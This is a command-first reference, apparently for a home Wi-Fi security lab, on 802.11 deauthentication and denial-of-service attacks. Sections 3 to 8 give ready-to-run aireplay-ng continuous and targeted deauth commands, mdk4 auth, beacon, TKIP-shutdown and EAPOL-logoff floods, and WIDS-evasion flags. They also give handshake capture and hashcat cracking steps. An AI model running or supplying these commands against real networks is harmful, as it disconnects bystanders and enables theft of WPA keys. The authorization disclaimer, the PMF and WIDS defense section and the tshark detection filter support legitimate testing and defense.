# Deauth & 802.11 DoS — Command-First Reference

> **Scope & authorization.** This file is a knowledge base for a **local, allowlist-gated** Wi-Fi security lab. Every command here is for **your own gear, a sanctioned CTF/competition range, or OSWP study on networks you own or have explicit written permission to test.** Deauth/DoS frames are *transmitted into the air* and hit every client on the channel in range — they are not scoped to one wire. Running them against networks you do not control is illegal in most jurisdictions (US CFAA, UK CMA, etc.). Gate every target in this module behind your BSSID/ESSID allowlist and confirm the physical environment before keying up.
>
> Hardware assumed: Mac host → Kali (VM/bare) → **TP-Link RTL8188EUS** (2.4 GHz, `aircrack-ng`-friendly injection). GPU cracking lives in the hashcat/handshake module; this file is about the *disruption/forced-reauth* primitive.

---

## 1. Concept (brief)

802.11 **management frames** (deauthentication, disassociation, authentication, beacon, probe) are, on WPA2-Personal without 802.11w, **unauthenticated and unencrypted**. Any radio in range can forge them:

- A **deauth** frame spoofed as *from the AP to a client* (or vice-versa) tears down that client's association instantly. The client must redo the 4-way handshake to get back on.
- This is a **two-for-one primitive**: it is both a **DoS** (keep sending → client can never stay connected) *and* the standard way to **force a 4-way handshake** so you can capture the WPA/WPA2 PMKID/EAPOL for offline cracking (that capture half lives in the handshake module; here we own the *forcing*).
- **Disassociation** is a sibling frame (reason-coded differently) with the same effect; tools send one or both.
- Beyond unicast deauth there is a family of **802.11 DoS floods** (auth flood, beacon flood, Michael/TKIP shutdown, EAPOL logoff, CTS/RTS, WIDS confusion) — `mdk4` is the Swiss-army knife for these.

The defensive counter is **802.11w / Protected Management Frames (PMF)**, which cryptographically signs deauth/disassoc so forged ones are dropped. WPA3 *requires* PMF; WPA2 can enable it optionally. PMF closes the classic attack but has documented edge-case bypasses (see §9).

---

## 2. The pros' decision order (what to try, in sequence)

```
0. Confirm target is on the ALLOWLIST. Confirm you are the owner / have written scope.
1. Monitor mode up, processes killed, LOCKED to the AP's channel.   (airmon-ng)
2. Recon: get BSSID, channel, and — critically — associated CLIENT MACs. (airodump-ng)
3. Is the goal a HANDSHAKE or pure DoS?
      - Handshake  -> start airodump capture on the BSSID, THEN a SHORT targeted deauth (3–10), watch for WPA handshake, stop.
      - Pure DoS   -> continuous targeted or broadcast deauth, or escalate to mdk4.
4. Prefer TARGETED (-c <client>) over broadcast. Many clients ignore broadcast deauth.
5. No clients associated? Deauth is useless -> switch to PMKID capture (hcxdumptool), or mdk4 auth/beacon flood for disruption testing.
6. Deauth not working? -> check PMF (802.11w). If PMF is on, classic deauth fails by design -> note it, test the flooding edge-case (§9), pivot to PMKID.
7. Always pair the finding with the DEFENSE recommendation (§10). That is the deliverable.
```

---

## 3. Stage the radio (every session starts here)

```bash
# 0. See the interface, driver, chipset
sudo airmon-ng

# 1. Find processes that will fight you (NetworkManager, wpa_supplicant, dhclient)
sudo airmon-ng check

# 2. Kill them (otherwise channel-hopping / injection gets disrupted)
sudo airmon-ng check kill

# 3. Monitor mode, LOCKED to the target channel (e.g. ch 6). Channel lock matters:
#    aireplay waits for a beacon on the AP's channel; a hopping card may miss it.
sudo airmon-ng start wlan0 6
#    -> creates wlan0mon (use this name everywhere below)

# Verify monitor + channel
iw dev wlan0mon info          # should show type monitor, channel 6
```

**RTL8188EUS note:** use the `aircrack-ng`/`8188eus` driver with injection support (the `aircrack-ng/rtl8188eus` or `morrownr/8188eu` DKMS build). Confirm injection before trusting results:

```bash
sudo aireplay-ng --test wlan0mon     # injection + ping test; look for "Injection is working!"
```

If `airmon-ng start` leaves a hopping interface, hard-lock the channel:

```bash
sudo iw dev wlan0mon set channel 6
# or for HT40:  sudo iw dev wlan0mon set channel 6 HT40+
```

---

## 4. Recon — you cannot deauth what you cannot see

```bash
# Survey everything (2.4 GHz with this adapter). Note BSSID + CH of the target.
sudo airodump-ng wlan0mon

# Lock to the target channel, filter to one AP, and WRITE a capture (for handshake).
# The STATION rows under the AP are your client targets (-c values).
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /root/lab/chan6 wlan0mon
```

Read the airodump panes:
- **Top pane** = APs. Columns that matter: `BSSID`, `CH`, `ENC/CIPHER/AUTH` (WPA2 vs WPA3/SAE), `PWR` (closer to 0 = stronger).
- **`MFP` / RSN capability** — if the AP advertises **PMF required**, plan for §9. airodump's AUTH `SAE` = WPA3 (PMF mandatory).
- **Bottom pane** = STATIONs. The `STATION` MAC associated to your `BSSID` is the ideal `-c` target. `(not associated)` clients can't be deauthed off that AP.

Pro move: keep this airodump running in one pane *while* you deauth in another — the top-right **`WPA handshake: AA:BB:CC:...`** banner is your success signal for the capture use-case.

---

## 5. aireplay-ng `--deauth` — the core primitive

### 5.1 Canonical commands

```bash
# TARGETED deauth (preferred): kick ONE client off the AP.
# -0 / --deauth = attack; the number = how many deauth BURSTS to send (0 = continuous).
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Continuous targeted DoS (runs until Ctrl-C):
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# BROADCAST deauth (all clients; less reliable — many clients ignore it):
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# SHORT burst for handshake capture (do NOT flood — you just need one reconnect):
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### 5.2 Flag reference (from the aireplay-ng man page / aircrack-ng.org)

| Flag | Meaning |
|---|---|
| `-0 <n>` / `--deauth <n>` | Deauth attack. `<n>` = number of bursts; **`0` = continuous**. |
| `-a <bssid>` | AP MAC (the BSSID). Replay/target option. |
| `-c <client>` | Destination client MAC. **Omit → broadcast to all clients.** |
| `-h <smac>` | Source MAC to spoof the frame *from* (defaults appropriately; set it to match a real STA/AP if a driver filters). |
| `-D` | **Disable AP detection** — skip the "waiting for beacon" wait. Useful when you've already channel-locked and airodump confirms the AP; stops aireplay hunting for the beacon. |
| `-x <pps>` | Packets per second cap (throttle to be less noisy / avoid self-DoS of your radio). |
| `-Z <rc>` / `--deauth-rc <rc>` | **Reason code** 0–255. **Default 7** = "Class 3 frame received from unassociated STA." `0` is reserved. |
| `--ignore-negative-one` | Ignore "fixed channel -1" mismatch (needed on some/unpatched cfg80211 drivers where the channel reads as -1). |
| `-b <bssid>` / `-d` / `-s` | Filter-side equivalents (AP / dest / source) used by other attack modes. |

### 5.3 Mechanics worth knowing

- A **directed** (`-c`) deauth sends **128 frames per count specified**: 64 to the AP spoofed-from-client + 64 to the client spoofed-from-AP. So `-0 1` with `-c` is already 128 frames, not 1.
- **ACK column** in output `[ 61|63 ACKs]` = ACKs heard from (client|AP). **Zero ACKs** ≈ the device didn't hear you → you're too far, wrong channel, or wrong PHY. A healthy run shows an ACK for most frames.
- **Reason code is cosmetic for the DoS** — research (Lounis et al., "Cut It", FPS 2021) found reason codes across 0–254 had equivalent effect; code 7 default is fine. Changing it (e.g. `-Z 1`, `-Z 2`) is mainly for evading naive signature-based WIDS that key on code 7.

---

## 6. mdk4 — the 802.11 DoS multitool

`mdk4` (successor to mdk3) covers the DoS surface aireplay doesn't. **Usage shape:**

```bash
mdk4 <interface> <attack_mode> [attack_options]
mdk4 --fullhelp                 # every option
mdk4 --help <mode_letter>       # one mode's options
```

### 6.1 Attack modes (from kali.org/tools/mdk4 + man page)

| Mode | Name | What it does |
|---|---|---|
| `d` | **Deauth / Disassoc** | Sends deauth+disassoc to stations seen with data traffic; disconnects clients from an AP. Supports whitelist/blacklist + channel hopping. |
| `a` | **Authentication DoS** | Floods an AP with auth frames; too many fake clients can freeze/reset weak APs. |
| `b` | **Beacon Flood** | Spawns many fake APs; can crash scanners/drivers, clutter the air. |
| `p` | **SSID Probe / Bruteforce** | Probes AP, decloaks hidden SSIDs (wordlist or brute). |
| `m` | **Michael (TKIP) shutdown** | Triggers TKIP Michael countermeasures → AP shuts ~60 s. Only affects TKIP. |
| `e` | **EAPOL Start/Logoff** | Floods EAPOL-Start (exhaust AP) or spoofs EAPOL-Logoff to kick clients. |
| `s` | **802.11s Mesh** | Mesh link/route attacks (black holes, flooding). |
| `w` | **WIDS Confusion** | Cross-connects WDS/rogue APs to confuse IDS/IPS. |
| `f` | **Packet Fuzzer** | Generic 802.11 fuzzer. |
| `x` | **Protocol PoC** | Tests implementation vulns; may crash the device. |

### 6.2 Deauth mode `d` — options and examples

```bash
# Deauth everything mdk4 sees on the current channel (broad, noisy):
sudo mdk4 wlan0mon d

# Targeted by BSSID + ESSID, throttled, with a WHITELIST so you don't hit your own kit:
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -E "TargetSSID" -s 200

# Blacklist file of BSSIDs to attack, with channel hopping across 2.4 GHz:
sudo mdk4 wlan0mon d -b blacklist.txt -c 1,6,11
```

Mode `d` options (man page):

| Flag | Meaning |
|---|---|
| `-w <file>` | **Whitelist** file of MACs to *ignore* (protect your own devices — set this!). |
| `-b <file>` | **Blacklist** file of MACs to *attack*. |
| `-B <bssid>` | Single BSSID to attack. |
| `-E <essid>` | Target by ESSID name. |
| `-S <mac>` | Specific station MAC to attack. |
| `-c <ch[,ch...]>` | Channel(s) to hop; `-c h` hops all 14 b/g channels (~3 s each). |
| `-s <pps>` | Speed in packets/sec (default unlimited — **throttle in a lab**). |
| `-x` | Full IDS stealth: match sequence numbers, send only with client addresses. |

### 6.3 Other DoS modes — examples

```bash
# Auth DoS against one AP, using plausible client MACs from the OUI DB:
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -m

# Beacon flood: 200 fake APs/sec on channel 6 using valid-looking AP MACs:
sudo mdk4 wlan0mon b -s 200 -c 6 -m
# ...or named SSIDs from a file:
sudo mdk4 wlan0mon b -f ssids.txt -s 100

# Michael/TKIP shutdown (ONLY if the AP still runs TKIP — rare, legacy):
sudo mdk4 wlan0mon m -t AA:BB:CC:DD:EE:FF

# EAPOL logoff flood (kick 802.1X/EAPOL clients):
sudo mdk4 wlan0mon e -t AA:BB:CC:DD:EE:FF
```

### 6.4 IDS-evasion modifiers (append to any mode)

```bash
# Rate/power switching to dodge threshold-based WIDS (driver-dependent):
sudo mdk4 wlan0mon d -B <bssid> --ghost 10,100,1
# syntax: --ghost <period>,<max_rate>,<min_txpower>

# Fragment outgoing frames (max_frags 0 = standards-compliant):
sudo mdk4 wlan0mon d -B <bssid> --frag 2,8,50
```

---

## 7. Targeted vs broadcast — the reliability rule

- **Targeted (`-c <client>` / mdk4 `-S`)**: 64+64 directed frames, acknowledged, and **works on clients that ignore broadcast deauth** (most modern phones/laptops do ignore broadcast). This is the default pro choice.
- **Broadcast (no `-c`)**: one frame addressed to `FF:FF:FF:FF:FF:FF`. Cheap and wide, but many stacks drop it. Use it only to *sweep* an AP when you can't enumerate clients, then follow up targeted.
- **Handshake capture ≠ DoS**: for a handshake you want the *minimum* disruption — `-0 3` and stop the moment airodump shows `WPA handshake`. Continuous flooding can actually *prevent* the capture by never letting the 4-way handshake complete.

---

## 8. Capturing while you deauth (the handshake half, briefly)

Deauth's main non-DoS purpose is forcing a reconnect to grab the 4-way handshake. Flow (capture lives in the handshake module; shown here for the forcing context):

```bash
# Pane 1 — capture, locked to the AP:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /root/lab/hs wlan0mon

# Pane 2 — short targeted deauth; watch Pane 1 top-right for "WPA handshake":
sudo aireplay-ng -0 4 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Then convert / crack elsewhere (GPU module):
#   hcxpcapngtool -o hs.hc22000 /root/lab/hs-01.cap
#   hashcat -m 22000 hs.hc22000 wordlist.txt
```

If **no client is associated**, deauth has nothing to force — skip straight to **clientless PMKID capture** (`hcxdumptool` → `-m 22000`), which needs no deauth at all.

---

## 9. 802.11w / PMF — the bound on this whole technique

**This is the single most important limit to document.** PMF (Protected Management Frames, 802.11w) signs deauth/disassoc frames with the established key, so **forged/unprotected deauths are cryptographically rejected.** Consequences for the lab:

- **WPA3-Personal (SAE)** → PMF is **mandatory**. Classic aireplay/mdk4 deauth **does not disconnect** a properly implemented WPA3 client. Expect ACK=0 / no disassociation.
- **WPA2 with PMF = required (MFPR)** → same: classic deauth fails.
- **WPA2 with PMF = capable/optional (MFPC)** or **WPA3-transition mode** → the weak spot. Transition mode keeps WPA2 clients working with PMF only "capable," so **WPA2-era clients still accept unprotected deauth** even on a "WPA3" SSID. Most "WPA3" deployments are effectively attackable here. (SecureW2; Purple; Lounis et al.)
- **PMF-enabled but still kickable (edge cases):**
  - **Flooding malformed/invalid deauth** has been observed to still disconnect some PMF clients — not by breaking crypto but by **overwhelming the client** during scan/processing. A PoC (KTO) disconnected 3 fully-patched Android phones in ~9 s on average; iOS/Windows/IoT untested. Root cause (driver vs firmware) not pinned down — treat as implementation-dependent.
  - **Protected-frame processing bugs**: Schepers, Ranganathan & Vanhoef (2022) found contradictory/under-specified rules in robust-management-frame handling enabling replay of protected management frames in some stacks.
  - **Spoofed-PMKID / malformed RSN-tag** test cases (hostap `wifi-deauthentication` repo) coaxed victims into emitting a protected deauth; related IGTK issue patched as **CVE-2023-21061** (Android, March 2023).
- **Unaffected-by-PMF primitives still work**: PMF protects *management* frames, so **auth flood (mdk4 `a`)**, **beacon flood (mdk4 `b`)**, and radio-layer jamming are *not* stopped by 802.11w — they operate before/around the protected association.

**Lab takeaway:** always read the AP's RSN `MFP` capability first (airodump / `iw`). If PMF is required, record "deauth mitigated by 802.11w" as the *result*, test the flooding edge-case only as a documented experiment, and pivot to PMKID for the handshake objective.

---

## 10. DEFENSE — the required pairing for every finding

Every deauth/DoS test must ship with its mitigation. This is the deliverable, not an afterthought.

1. **Enable 802.11w / PMF.** Set **PMF = required** where client fleet allows; **PMF = optional** only as a stepping stone. This is the #1 control and neutralizes classic deauth.
2. **Move to WPA3-Personal (SAE)** (PMF mandatory). Avoid long-lived **WPA3-transition mode** — it reopens the WPA2 PMF-optional hole. Disable transition mode once legacy clients are retired.
3. **Deploy a WIDS/WIPS** that alerts on management-frame anomalies. Concrete signatures to watch (vendor + open-source precedent):
   - **Deauth/disassoc flood rate** per source/BSSID (e.g. FortiGate WIDS `deauth broadcast` + `spoofed deauth` detection; per-second thresholds for deauth to unknown sources).
   - **Kismet** `DEAUTHFLOOD` / `BCASTDISCON` alerts.
   - **Beacon/auth flood** signatures for mdk4 `b`/`a`.
   - A deauth flood often **precedes an evil-twin** — correlate the two (a flood then a new BSSID with the same ESSID).
4. **Detect cheaply yourself** (own lab / blue-team drill):
   ```bash
   # Wireshark/tshark: count deauth (subtype 12) + disassoc (subtype 10) frames
   tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c || wlan.fc.type_subtype == 0x0a" \
          -T fields -e wlan.sa -e wlan.da -e wlan.fixed.reason_code
   # A burst of subtype-12 frames with reason code 7 from your AP's BSSID = classic deauth attack.
   ```
5. **Firmware/driver updates** on APs *and clients* — the PMF flooding/replay bypasses are implementation bugs; patched stacks (e.g. CVE-2023-21061 fix) resist them.
6. **Don't rely on**: MAC filtering (trivially spoofed), SSID hiding (decloaked by mdk4 `p`), or a VPN (encrypts traffic but does nothing against layer-2 deauth). Record these as *ineffective* controls if a client proposes them.
7. **Physical/RF**: for high-value APs, reduce external RF exposure and prefer wired for critical endpoints — the only hard stop for a flood an attacker can physically reach.

---

## 11. Gotchas & pitfalls (field notes)

- **Channel lock is everything.** If airodump/aireplay hop or sit on `-1`, deauth silently fails. Lock with `airmon-ng start wlan0 <ch>` or `iw ... set channel`; add `--ignore-negative-one` and `-D` to stop aireplay hunting beacons.
- **`airmon-ng check kill` or NetworkManager wins.** A living NetworkManager will yank your card back to managed mode or hop it mid-attack.
- **ACK=0 means you failed, not that the target is immune.** Check distance, PHY mismatch (your card in g, client on n/ac — RTL8188EUS is 2.4-only, so 5 GHz clients are simply unreachable), and antenna.
- **Broadcast deauth looks like it "didn't work"** — it often didn't, for modern clients. Re-run targeted before concluding PMF.
- **Over-flooding kills your own capture.** For handshakes, less is more (`-0 3`), or the 4-way never completes.
- **5 GHz is out of scope for this adapter.** RTL8188EUS is 2.4 GHz only; APs/clients on 5/6 GHz won't be touched. Note band in the report.
- **mdk4 with no whitelist will deauth YOUR OWN devices** and anything else on channel. Always set `-w whitelist.txt` in a shared-air lab.
- **WPA3/PMF target → expect "nothing happens."** That's a *pass* for the defender; document it, don't assume broken tooling.
- **TKIP/Michael mode `m` is legacy-only** — almost no modern AP runs TKIP; skip unless you specifically stood up a legacy test AP.
- **Legality/air-scope.** Your deauth hits every reachable client, not a cabled target. In a shared building you can knock neighbors offline — confine to your own RF space / Faraday or low-power, and keep the allowlist authoritative.

---

## 12. Quick allowlist-gated wrapper pattern (lab hygiene)

Pseudo-flow your tool should enforce before any transmit:

```
target_bssid = input()
assert target_bssid in ALLOWLIST            # hard stop otherwise
assert band(target_bssid) == "2.4GHz"       # RTL8188EUS limit
pmf = read_rsn_mfp(target_bssid)            # airodump/iw
if pmf == "required":
    log("Deauth expected to be mitigated by 802.11w — documenting, pivot to PMKID")
build whitelist.txt from ALLOWLIST-owned-devices   # protect own kit (mdk4 -w)
run short targeted deauth; capture; stop on handshake
emit finding + DEFENSE block (§10)
```

---

## Sources

Official tool docs / man pages:
- aircrack-ng.org — Deauthentication tutorial: https://www.aircrack-ng.org/doku.php?id=deauthentication
- aireplay-ng(8) man page (Ubuntu): https://manpages.ubuntu.com/manpages/noble/man8/aireplay-ng.8.html
- aireplay-ng(8) man page (Arch): https://man.archlinux.org/man/aireplay-ng.8.en
- Kali Tools — aircrack-ng (airmon-ng / airodump-ng workflow): https://www.kali.org/tools/aircrack-ng/
- Kali Tools — mdk4: https://www.kali.org/tools/mdk4/
- mdk4(8) man page (Arch — full per-mode options): https://man.archlinux.org/man/mdk4.8.en

802.11w / PMF, WPA3, reason codes:
- Aruba/HPE — Protected Management Frames (MFPC vs MFPR): https://arubanetworking.hpe.com/techdocs/aos/wifi-design-deploy/security/features/pmf/
- Cisco — Protected Management Frames / MFP: https://www.cisco.com/en/US/products/ps6366/products_tech_note09186a0080ad6b8d.shtml
- Aruba blog — 802.11 Reason & Status Codes: https://blogs.arubanetworks.com/ (802.11 reason/status codes)
- WPA3 transition-mode PMF-optional downgrade (SecureW2): https://securew2.com/ ; (Purple) https://www.purple.ai/guides/wpa3-transition-mode-connection-failures

Research / advisories (PMF bypass & reason-code behavior):
- Lounis, Ding, Zhao — "Cut It: Deauthentication Attacks on PMF-enabled WPA2/WPA3" (FPS 2021): https://unpaywall.org/10.1007%2F978-3-031-08147-7_16
- Schepers, Ranganathan, Vanhoef — Protected management frame processing/replay (2022): https://lirias.kuleuven.be/retrieve/667987
- hostap — wifi-deauthentication test suite (spoofed PMKID / IGTK, CVE-2023-21061): https://github.com/domienschepers/wifi-deauthentication
- OffSeq advisory — flooding invalid deauth still kicks PMF clients (KTO PoC): https://radar.offseq.com/threat/flooding-invalid-deauth-frames-still-kicks-pmf-cli-b4b79764

Detection / WIDS:
- Fortinet — WIDS profile (deauth broadcast / spoofed deauth / flood thresholds): https://docs.fortinet.com/document/fortiap/6.4.1/fortiwifi-and-fortiap-configuration-guide/961129
- Null Byte — detect Wi-Fi deauth jamming with Wireshark: https://null-byte.wonderhowto.com/how-to/detect-script-kiddie-wi-fi-jamming-with-wireshark-0186138
